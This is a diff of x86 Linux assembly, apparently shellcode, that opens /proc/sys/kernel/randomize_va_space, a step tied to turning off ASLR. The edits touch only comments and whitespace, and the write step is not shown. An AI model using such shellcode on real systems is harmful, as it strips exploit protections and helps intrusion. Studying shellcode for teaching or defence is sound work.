@@ -12,10 +12,10 @@ _start:
     push 0x656e7265
     push 0x6b2f7379
     push 0x732f636f
-    push 0x72702f2f     ;Push //proc/sys/kernel/randomize_va_space
+    push 0x72702f2f     
     mov ebx, esp        ;Initialize ebx to "//proc/sys/kernel/randomize_va_space%00"
     mov cx, 0x2bc       ;Move 0x2bc on the stack which is 700 in decimal 
-                        ;700 means the file is opened with READ, WRITE, EXECUTE flags.
+                        ;700 means the file is opened with READ, WRITE, EXECUTE flags (S_IRWXU).
     mov al, 0x8         ;Initialize al to systemcall number of "open"
 
     ;Systemcall details:
@@ -38,6 +38,7 @@ _start:
 
 
     mov al, 0x6         ;Initialize al to systemcall number of "close"
+    
     ;Systemcall details:
     ; --> close(3)
     int 0x80            ;Execute systemcall
@@ -45,6 +46,7 @@ _start:
 
     xor eax, eax        ;Initialize al to systemcall number of "exit"
     xor ebx, ebx        ;Initiliaze ebx to NULL
+
     ;Systemcall details:
     ; --> exit(0)
     int 0x80            ;Execute systemcall
